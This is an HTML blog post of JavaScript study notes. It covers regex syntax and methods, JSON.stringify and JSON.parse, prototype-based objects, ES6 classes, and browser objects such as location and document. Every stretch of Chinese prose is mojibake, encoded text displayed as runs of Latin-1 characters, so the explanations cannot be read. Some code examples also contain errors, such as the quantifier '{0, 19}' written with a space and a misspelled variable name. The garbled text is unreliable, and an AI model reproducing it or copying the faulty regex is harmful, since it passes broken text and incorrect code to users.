<h2 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp"></a>RegExp</h2><h3 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a><strong>åŸºç¡€</strong></h3><p><code>\d</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªæ•°å­—</p>
<p><code>\w</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªå­—æ¯æˆ–æ•°å­—</p>
<p><code>.</code>å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦</p>
<p><code>*</code>è¡¨ç¤ºä»»æ„ä¸ªå­—ç¬¦</p>
<p><code>+</code>è¡¨ç¤ºè‡³å°‘ä¸€ä¸ªå­—ç¬¦</p>
<p><code>?</code>è¡¨ç¤º0ä¸ªæˆ–1ä¸ªå­—ç¬¦</p>
<p><code>{n}</code>è¡¨ç¤ºnä¸ªå­—ç¬¦</p>
<p><code>{n,m}</code>è¡¨ç¤ºn-mä¸ªå­—ç¬¦</p>
<h3 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a><strong>è¿›é˜¶</strong></h3><p>è¦åšæ›´ç²¾ç¡®åœ°åŒ¹é…ï¼Œå¯ä»¥ç”¨<code>[]</code>è¡¨ç¤ºèŒƒå›´</p>
<ul>
<li><code>[0-9a-zA-Z\_]</code>å¯ä»¥åŒ¹é…ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ï¼›</li>
<li><code>[0-9a-zA-Z\_]+</code>å¯ä»¥åŒ¹é…è‡³å°‘ç”±ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚<code>&#39;a100&#39;</code>ï¼Œ<code>&#39;0_Z&#39;</code>ï¼Œ<code>&#39;js2015&#39;</code>ç­‰ç­‰ï¼›</li>
<li><code>[a-zA-Z\_\$][0-9a-zA-Z\_\$]*</code>å¯ä»¥åŒ¹é…ç”±å­—æ¯æˆ–ä¸‹åˆ’çº¿ då·å¼€å¤´ï¼Œåæ¥ä»»æ„ä¸ªç”±ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ då·ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯JavaScriptå…è®¸çš„å˜é‡åï¼›</li>
<li><code>[a-zA-Z\_\$][0-9a-zA-Z\_\$]{0, 19}</code>æ›´ç²¾ç¡®åœ°é™åˆ¶äº†å˜é‡çš„é•¿åº¦æ˜¯1-20ä¸ªå­—ç¬¦ï¼ˆå‰é¢1ä¸ªå­—ç¬¦+åé¢æœ€å¤š19ä¸ªå­—ç¬¦ï¼‰ã€‚</li>
</ul>
<p><code>A|B</code>å¯ä»¥åŒ¹é…Aæˆ–B</p>
<p><code>^</code>è¡¨ç¤ºè¡Œçš„å¼€å¤´ï¼Œ<code>^\d</code>è¡¨ç¤ºå¿…é¡»ä»¥æ•°å­—å¼€å¤´ã€‚</p>
<p><code>$</code>è¡¨ç¤ºè¡Œçš„ç»“æŸï¼Œ<code>\d$</code>è¡¨ç¤ºå¿…é¡»ä»¥æ•°å­—ç»“æŸã€‚</p>
<h3 id="jsæ­£åˆ™"><a href="#jsæ­£åˆ™" class="headerlink" title="jsæ­£åˆ™"></a><strong>jsæ­£åˆ™</strong></h3><p>JavaScriptæœ‰ä¸¤ç§æ–¹å¼åˆ›å»ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
<p>ç¬¬ä¸€ç§æ–¹å¼æ˜¯ç›´æ¥é€šè¿‡<code>/æ­£åˆ™è¡¨è¾¾å¼/</code>å†™å‡ºæ¥ï¼Œç¬¬äºŒç§æ–¹å¼æ˜¯é€šè¿‡<code>new RegExp(&#39;æ­£åˆ™è¡¨è¾¾å¼&#39;)</code>åˆ›å»ºä¸€ä¸ªRegExpå¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;ç¬¬ä¸€ç§</span><br><span class="line">var re1 &#x3D; &#x2F;ABC&#x2F;;</span><br><span class="line">&#x2F;&#x2F;ç¬¬äºŒç§</span><br><span class="line">var re2 &#x3D; new RegExp(&#39;ABC&#39;);</span><br></pre></td></tr></table></figure>
<p>RegExpå¯¹è±¡çš„<code>test()</code>æ–¹æ³•ç”¨äºæµ‹è¯•ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re2.test(&#39;ABC&#39;);  &#x2F;&#x2F;true</span><br><span class="line">re2.test(&#39;abc&#39;);  &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>
<p><strong>åˆ‡åˆ†å­—ç¬¦ä¸²</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">'a b   c'</span>.split(<span class="string">' '</span>); <span class="comment">// ['a', 'b', '', '', 'c']</span></span><br><span class="line"><span class="string">'a b   c'</span>.split(<span class="regexp">/\s+/</span>); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"><span class="string">'a,b, c  d'</span>.split(<span class="regexp">/[\s\,]+/</span>); <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br><span class="line"><span class="string">'a,b;; c  d'</span>.split(<span class="regexp">/[\s\,\;]+/</span>); <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure>
<p><strong>åˆ†ç»„</strong></p>
<p>ç”¨<code>()</code>è¡¨ç¤ºçš„å°±æ˜¯è¦æå–çš„åˆ†ç»„ï¼ˆGroupï¼‰</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$/</span>;</span><br><span class="line">re.exec(<span class="string">'010-12345'</span>); <span class="comment">// ['010-12345', '010', '12345']</span></span><br><span class="line">re.exec(<span class="string">'010 12345'</span>); <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ­£åˆ™è¡¨è¾¾å¼ä¸­å®šä¹‰äº†ç»„ï¼Œå°±å¯ä»¥åœ¨<code>RegExp</code>å¯¹è±¡ä¸Šç”¨<code>exec()</code>æ–¹æ³•æå–å‡ºå­ä¸²æ¥ã€‚</p>
<p><code>exec()</code>æ–¹æ³•åœ¨åŒ¹é…æˆåŠŸåï¼Œä¼šè¿”å›ä¸€ä¸ª<code>Array</code>ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œåé¢çš„å­—ç¬¦ä¸²è¡¨ç¤ºåŒ¹é…æˆåŠŸçš„å­ä¸²ã€‚</p>
<p><code>exec()</code>æ–¹æ³•åœ¨åŒ¹é…å¤±è´¥æ—¶è¿”å›<code>null</code>ã€‚</p>
<h3 id="è´ªå©ªåŒ¹é…"><a href="#è´ªå©ªåŒ¹é…" class="headerlink" title="*è´ªå©ªåŒ¹é…"></a><strong>*è´ªå©ªåŒ¹é…</strong></h3><p>éœ€è¦ç‰¹åˆ«æŒ‡å‡ºçš„æ˜¯ï¼Œæ­£åˆ™åŒ¹é…é»˜è®¤æ˜¯è´ªå©ªåŒ¹é…ï¼Œä¹Ÿå°±æ˜¯åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼ŒåŒ¹é…å‡ºæ•°å­—åé¢çš„<code>0</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var re &#x3D; &#x2F;^(\d+)(0*)$&#x2F;;</span><br><span class="line">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;]</span><br></pre></td></tr></table></figure>
<p>ç”±äº<code>\d+</code>é‡‡ç”¨è´ªå©ªåŒ¹é…ï¼Œç›´æ¥æŠŠåé¢çš„<code>0</code>å…¨éƒ¨åŒ¹é…äº†ï¼Œç»“æœ<code>0*</code>åªèƒ½åŒ¹é…ç©ºå­—ç¬¦ä¸²äº†ã€‚</p>
<p>å¿…é¡»è®©<code>\d+</code>é‡‡ç”¨éè´ªå©ªåŒ¹é…ï¼ˆä¹Ÿå°±æ˜¯å°½å¯èƒ½å°‘åŒ¹é…ï¼‰ï¼Œæ‰èƒ½æŠŠåé¢çš„<code>0</code>åŒ¹é…å‡ºæ¥ï¼ŒåŠ ä¸ª<code>?</code>å°±å¯ä»¥è®©<code>\d+</code>é‡‡ç”¨éè´ªå©ªåŒ¹é…ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var re &#x3D; &#x2F;^(\d+?)(0*)$&#x2F;;</span><br><span class="line">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;]</span><br></pre></td></tr></table></figure>
<p><strong>å…¨å±€æœç´¢</strong></p>
<p>JavaScriptçš„æ­£åˆ™è¡¨è¾¾å¼è¿˜æœ‰å‡ ä¸ªç‰¹æ®Šçš„æ ‡å¿—ï¼Œæœ€å¸¸ç”¨çš„æ˜¯<code>g</code>ï¼Œè¡¨ç¤ºå…¨å±€åŒ¹é…ã€‚æ­£åˆ™è¡¨è¾¾å¼è¿˜å¯ä»¥æŒ‡å®š<code>i</code>æ ‡å¿—ï¼Œè¡¨ç¤ºå¿½ç•¥å¤§å°å†™ï¼Œ<code>m</code>æ ‡å¿—ï¼Œè¡¨ç¤ºæ‰§è¡Œå¤šè¡ŒåŒ¹é…ã€‚</p>
<p><strong>ä½œä¸š</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¯·å°è¯•å†™ä¸€ä¸ªéªŒè¯Emailåœ°å€çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</span></span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^[0-9a-zA-Z\.]+\@[0-9a-zA-Z]+\.(com|org)$/</span>;</span><br><span class="line">hould_pass = [<span class="string">'someone@gmail.com'</span>, <span class="string">'bill.gates@microsoft.com'</span>, <span class="string">'tom@voyager.org'</span>, <span class="string">'bob2015@163.com'</span>],</span><br><span class="line">    should_fail = [<span class="string">'test#gmail.com'</span>, <span class="string">'bill@microsoft'</span>, <span class="string">'bill%gates@ms.com'</span>, <span class="string">'@voyager.org'</span>];</span><br><span class="line"><span class="comment">//éªŒè¯å¹¶æå–å‡ºå¸¦åå­—çš„Emailåœ°å€</span></span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^\&lt;(\w+\s+\w+)\&gt; (\w+\.*\@\w+\.+\w+)$/</span>;</span><br><span class="line">shoule_pass = <span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>å†™æ­£åˆ™é¦–å…ˆè¦æ³¨æ„è½¬ä¹‰å¦‚ï¼š\s ,\w,\d</li>
<li>å¤§å°å†™ç”¨iæ ‡å¿—</li>
</ul>
<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><ul>
<li>numberï¼šå’ŒJavaScriptçš„<code>number</code>å®Œå…¨ä¸€è‡´ï¼›</li>
<li>booleanï¼šå°±æ˜¯JavaScriptçš„<code>true</code>æˆ–<code>false</code>ï¼›</li>
<li>stringï¼šå°±æ˜¯JavaScriptçš„<code>string</code>ï¼›</li>
<li>nullï¼šå°±æ˜¯JavaScriptçš„<code>null</code>ï¼›</li>
<li>arrayï¼šå°±æ˜¯JavaScriptçš„<code>Array</code>è¡¨ç¤ºæ–¹å¼â€”â€”<code>[]</code>ï¼›</li>
<li>objectï¼šå°±æ˜¯JavaScriptçš„<code>{ ... }</code>è¡¨ç¤ºæ–¹å¼ã€‚</li>
</ul>
<p>ä¸ºäº†ç»Ÿä¸€è§£æï¼ŒJSONçš„å­—ç¬¦ä¸²è§„å®šå¿…é¡»ç”¨åŒå¼•å·<code>&quot;&quot;</code>ï¼ŒObjectçš„é”®ä¹Ÿå¿…é¡»ç”¨åŒå¼•å·<code>&quot;&quot;</code>ã€‚</p>
<h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a><strong>åºåˆ—åŒ–</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">		name: <span class="string">'xiaoming'</span>,</span><br><span class="line">		age: <span class="number">14</span>,</span><br><span class="line">		height: <span class="number">165</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming);</span><br><span class="line"><span class="built_in">console</span>.log(s); <span class="comment">//&#123;"name":"xiaoming","age":14,"height":165&#125;</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming,<span class="literal">null</span>,<span class="string">' '</span>); </span><br><span class="line"><span class="built_in">console</span>.log(s); <span class="comment">//"&#123;</span></span><br><span class="line"> <span class="string">"name"</span>: <span class="string">"xiaoming"</span>,</span><br><span class="line"> <span class="string">"age"</span>: <span class="number">14</span>,</span><br><span class="line"> <span class="string">"height"</span>: <span class="number">165</span></span><br><span class="line">&#125;<span class="string">"</span></span><br><span class="line"><span class="string">//stringify(a,b,c)</span></span><br><span class="line"><span class="string">//aä¸ºå¯¹è±¡åï¼Œbä¸ºæŒ‡å®šçš„å±æ€§æˆ–è€…ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå¦‚['age','name'],cä¸º' 'ä»£è¡¨é€è¡Œè¾“å‡º</span></span><br></pre></td></tr></table></figure>
<h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>æ‹¿åˆ°ä¸€ä¸ªJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨<code>JSON.parse()</code>æŠŠå®ƒå˜æˆä¸€ä¸ªJavaScriptå¯¹è±¡ã€‚</p>
<p><code>JSON.parse()</code>è¿˜å¯ä»¥æ¥æ”¶ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è½¬æ¢è§£æå‡ºçš„å±æ€§ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">'&#123;"name":"å°æ˜","age":14&#125;'</span>); <span class="comment">// Object &#123;name: 'å°æ˜', age: 14&#125;</span></span><br><span class="line"><span class="comment">//æ¥å—å‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"name":"å°æ˜","age":14&#125;'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">key,value</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (key ===<span class="string">'name'</span>)&#123;<span class="keyword">return</span> value + <span class="string">'åŒå­¦'</span>&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h1 id="é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>é¢å‘å¯¹è±¡ç¼–ç¨‹</h1><p>åœ¨jsä¸­æ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½æ˜¯å®ä¾‹ï¼Œç»§æ‰¿å…³ç³»ä¸è¿‡æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡çš„åŸå‹æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡è€Œå·²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; åŸå‹å¯¹è±¡:</span><br><span class="line">var Student &#x3D; &#123;</span><br><span class="line">    name: &#39;Robot&#39;,</span><br><span class="line">    height: 1.2,</span><br><span class="line">    run: function () &#123;</span><br><span class="line">        console.log(this.name + &#39; is running...&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function createStudent(name) &#123;</span><br><span class="line">    &#x2F;&#x2F; åŸºäºStudentåŸå‹åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡:</span><br><span class="line">    var s &#x3D; Object.create(Student);</span><br><span class="line">    &#x2F;&#x2F; åˆå§‹åŒ–æ–°å¯¹è±¡:</span><br><span class="line">    s.name &#x3D; name;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var xiaoming &#x3D; createStudent(&#39;å°æ˜&#39;);</span><br><span class="line">xiaoming.run(); &#x2F;&#x2F; å°æ˜ is running...</span><br><span class="line">xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>
<h2 id="åˆ›å»ºå¯¹è±¡"><a href="#åˆ›å»ºå¯¹è±¡" class="headerlink" title="åˆ›å»ºå¯¹è±¡"></a>åˆ›å»ºå¯¹è±¡</h2><p>JavaScriptå¯¹æ¯ä¸ªåˆ›å»ºçš„å¯¹è±¡éƒ½ä¼šè®¾ç½®ä¸€ä¸ªåŸå‹ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡ã€‚</p>
<p>å½“æˆ‘ä»¬ç”¨<code>obj.xxx</code>è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼ŒJavaScriptå¼•æ“å…ˆåœ¨å½“å‰å¯¹è±¡ä¸ŠæŸ¥æ‰¾è¯¥å±æ€§ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±åˆ°å…¶åŸå‹å¯¹è±¡ä¸Šæ‰¾ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¸€ç›´ä¸Šæº¯åˆ°<code>Object.prototype</code>å¯¹è±¡ï¼Œæœ€åï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±åªèƒ½è¿”å›<code>undefined</code>ã€‚</p>
<p><strong>æ„é€ å‡½æ•°</strong></p>
<p>é™¤äº†ç›´æ¥ç”¨<code>{ ... }</code>åˆ›å»ºä¸€ä¸ªå¯¹è±¡å¤–ï¼ŒJavaScriptè¿˜å¯ä»¥ç”¨ä¸€ç§æ„é€ å‡½æ•°çš„æ–¹æ³•æ¥åˆ›å»ºå¯¹è±¡ã€‚å®ƒçš„ç”¨æ³•æ˜¯ï¼Œå…ˆå®šä¹‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Student(name) &#123;</span><br><span class="line">    this.name &#x3D; name;</span><br><span class="line">    this.hello &#x3D; function () &#123;</span><br><span class="line">        alert(&#39;Hello, &#39; + this.name + &#39;!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var xiaoming &#x3D; new Student(&#39;xiaoming&#39;)</span><br></pre></td></tr></table></figure>
<p>å†™äº†<code>new</code>ï¼Œå®ƒå°±å˜æˆäº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒç»‘å®šçš„<code>this</code>æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œå¹¶é»˜è®¤è¿”å›<code>this</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸éœ€è¦åœ¨æœ€åå†™<code>return this;</code></p>
<p><strong>åŸå‹é“¾ï¼š</strong></p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730195400823.png" alt="image-20200730195400823"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å¸¸ç”¨åˆ›å»ºå¯¹è±¡</span><br><span class="line">function Student(props)&#123;</span><br><span class="line">	this.name &#x3D; props.name;</span><br><span class="line">	this.grade &#x3D; props.grade;</span><br><span class="line">&#125;</span><br><span class="line">Student.prototype.hello &#x3D; function()&#123;</span><br><span class="line">	alert(&#39;hello&#39;+this.name+&#39;.&#39;);</span><br><span class="line">&#125;</span><br><span class="line">function createStudent(props)&#123;</span><br><span class="line">	return new Student(props);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¦è®©åˆ›å»ºçš„å¯¹è±¡å…±äº«ä¸€ä¸ª<code>hello</code>å‡½æ•°ï¼Œæ ¹æ®å¯¹è±¡çš„å±æ€§æŸ¥æ‰¾åŸåˆ™ï¼Œæˆ‘ä»¬åªè¦æŠŠ<code>hello</code>å‡½æ•°ç§»åŠ¨åˆ°<code>xiaoming</code>ã€<code>xiaohong</code>è¿™äº›å¯¹è±¡å…±åŒçš„åŸå‹ä¸Šå°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯<code>Student.prototype</code></p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730200247420.png" alt="image-20200730200247420"></p>
<h2 id="åŸå‹ç»§æ‰¿"><a href="#åŸå‹ç»§æ‰¿" class="headerlink" title="åŸå‹ç»§æ‰¿"></a>åŸå‹ç»§æ‰¿</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = props.name || <span class="string">'Unnamed'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hello, '</span> + <span class="keyword">this</span>.name + <span class="string">'!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PrimaryStudent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨Studentæ„é€ å‡½æ•°ï¼Œç»‘å®šthiså˜é‡:</span></span><br><span class="line">    Student.call(<span class="keyword">this</span>, props);</span><br><span class="line">    <span class="keyword">this</span>.grade = props.grade || <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; <span class="built_in">Object</span>.prototype ----&gt; <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>ç†è§£æ–°çš„åŸå‹é“¾</p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730203439073.png" alt="image-20200730203439073"></p>
<h2 id="classç»§æ‰¿"><a href="#classç»§æ‰¿" class="headerlink" title="classç»§æ‰¿"></a>classç»§æ‰¿</h2><p><strong>classåˆ›å»ºå¯¹è±¡</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hello() &#123;</span><br><span class="line">        alert(<span class="string">'Hello, '</span> + <span class="keyword">this</span>.name + <span class="string">'!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">'xiaoming'</span>);</span><br><span class="line">xiaoming.hello();</span><br></pre></td></tr></table></figure>
<p><strong>classç»§æ‰¿</strong></p>
<p>ç›´æ¥é€šè¿‡<code>extends</code>å®ç°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrimaryStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name, grade) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name); <span class="comment">// è®°å¾—ç”¨superè°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•!</span></span><br><span class="line">        <span class="keyword">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myGrade() &#123;</span><br><span class="line">        alert(<span class="string">'I am at grade '</span> + <span class="keyword">this</span>.grade);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>éœ€è¦é€šè¿‡<code>super(name)</code>æ¥è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œå¦åˆ™çˆ¶ç±»çš„<code>name</code>å±æ€§æ— æ³•æ­£å¸¸åˆå§‹åŒ–ã€‚</p>
<h1 id="æµè§ˆå™¨"><a href="#æµè§ˆå™¨" class="headerlink" title="æµè§ˆå™¨"></a>æµè§ˆå™¨</h1><h2 id="æµè§ˆå™¨å¯¹è±¡"><a href="#æµè§ˆå™¨å¯¹è±¡" class="headerlink" title="æµè§ˆå™¨å¯¹è±¡"></a>æµè§ˆå™¨å¯¹è±¡</h2><p><strong>window</strong></p>
<p><code>window</code>å¯¹è±¡ä¸ä½†å……å½“å…¨å±€ä½œç”¨åŸŸï¼Œè€Œä¸”è¡¨ç¤ºæµè§ˆå™¨çª—å£ã€‚</p>
<ul>
<li><code>innerWidth</code> <code>innerHeight</code>å¯ä»¥è·å–æµè§ˆå™¨çª—å£çš„å†…éƒ¨é«˜åº¦å’Œå®½åº¦</li>
<li><code>outerWidth</code> <code>outerHeight</code>è·å–æµè§ˆå™¨çª—å£çš„æ•´ä¸ªå®½é«˜</li>
</ul>
<p><strong>navigator</strong></p>
<p><code>navigator</code>å¯¹è±¡è¡¨ç¤ºæµè§ˆå™¨çš„ä¿¡æ¯ï¼Œæœ€å¸¸ç”¨çš„å±æ€§åŒ…æ‹¬ï¼š</p>
<ul>
<li>navigator.appNameï¼šæµè§ˆå™¨åç§°ï¼›</li>
<li>navigator.appVersionï¼šæµè§ˆå™¨ç‰ˆæœ¬ï¼›</li>
<li>navigator.languageï¼šæµè§ˆå™¨è®¾ç½®çš„è¯­è¨€ï¼›</li>
<li>navigator.platformï¼šæ“ä½œç³»ç»Ÿç±»å‹ï¼›</li>
<li>navigator.userAgentï¼šæµè§ˆå™¨è®¾å®šçš„<code>User-Agent</code>å­—ç¬¦ä¸²ã€‚</li>
</ul>
<h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p><code>screen</code>å¯¹è±¡è¡¨ç¤ºå±å¹•çš„ä¿¡æ¯ï¼Œå¸¸ç”¨çš„å±æ€§æœ‰ï¼š</p>
<ul>
<li>screen.widthï¼šå±å¹•å®½åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼›</li>
<li>screen.heightï¼šå±å¹•é«˜åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼›</li>
<li>screen.colorDepthï¼šè¿”å›é¢œè‰²ä½æ•°ï¼Œå¦‚8ã€16ã€24ã€‚</li>
</ul>
<h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p><code>location</code>å¯¹è±¡è¡¨ç¤ºå½“å‰é¡µé¢çš„URLä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location.href  &#x2F;&#x2F;url</span><br><span class="line">location.protocol; &#x2F;&#x2F; &#39;http&#39;</span><br><span class="line">location.host; &#x2F;&#x2F; &#39;www.example.com&#39;</span><br><span class="line">location.port; &#x2F;&#x2F; &#39;8080&#39;</span><br><span class="line">location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;</span><br><span class="line">location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;</span><br><span class="line">location.hash; &#x2F;&#x2F; &#39;TOP&#39;</span><br><span class="line">location.assign(&#39;...&#39;)  &#x2F;&#x2F;åŠ è½½ä¸€ä¸ªæ–°çš„é¡µé¢</span><br><span class="line">location.reload()  &#x2F;&#x2F;é‡æ–°åŠ è½½å½“å‰é¡µé¢</span><br></pre></td></tr></table></figure>
<h3 id="document"><a href="#document" class="headerlink" title="document"></a>document</h3><p><code>document</code>å¯¹è±¡è¡¨ç¤ºå½“å‰é¡µé¢ã€‚ç”±äºHTMLåœ¨æµè§ˆå™¨ä¸­ä»¥DOMå½¢å¼è¡¨ç¤ºä¸ºæ ‘å½¢ç»“æ„ï¼Œ<code>document</code>å¯¹è±¡å°±æ˜¯æ•´ä¸ªDOMæ ‘çš„æ ¹èŠ‚ç‚¹ã€‚</p>
<p>ç”¨<code>document</code>å¯¹è±¡æä¾›çš„<code>getElementById()</code>å’Œ<code>getElementsByTagName()</code>å¯ä»¥æŒ‰IDè·å¾—ä¸€ä¸ªDOMèŠ‚ç‚¹å’ŒæŒ‰Tagåç§°è·å¾—ä¸€ç»„DOMèŠ‚ç‚¹</p>
<p><code>document</code>å¯¹è±¡è¿˜æœ‰ä¸€ä¸ª<code>cookie</code>å±æ€§ï¼Œå¯ä»¥è·å–å½“å‰é¡µé¢çš„Cookieã€‚JavaScriptå¯ä»¥é€šè¿‡<code>document.cookie</code>è¯»å–åˆ°å½“å‰é¡µé¢çš„Cookieã€‚</p>
